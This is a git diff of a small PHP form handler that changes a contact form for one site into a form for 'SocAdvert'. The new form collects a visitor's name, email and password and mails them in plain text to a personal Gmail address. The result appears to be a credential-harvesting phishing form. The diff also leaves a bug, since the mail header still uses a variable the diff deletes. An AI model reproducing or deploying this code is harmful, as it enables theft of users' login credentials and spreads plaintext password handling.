@@ -1,13 +1,12 @@
 <?php
 
 $recepient = "pashakiz@gmail.com";
-$sitename = "SyncroCity";
+$sitename = "SocAdvert";
 
 $name = trim($_POST["name"]);
-$phone = trim($_POST["phone"]);
-$text = trim($_POST["text"]);
+$email = trim($_POST["email"]);
+$pass = trim($_POST["pass"]);
 
-$EOL = "\r\n";
 $pagetitle = "Новая заявка с сайта \"$sitename\"";
-$message = "Имя: $name $EOLТелефон: $phone $EOLТекст: $text";
+$message = "Имя: $name \r\nEmail: $email \r\nПароль: $pass";
 mail($recepient, $pagetitle, $message, "Content-type: text/plain; charset=\"utf-8\"$EOL From: $name <$recepient>");
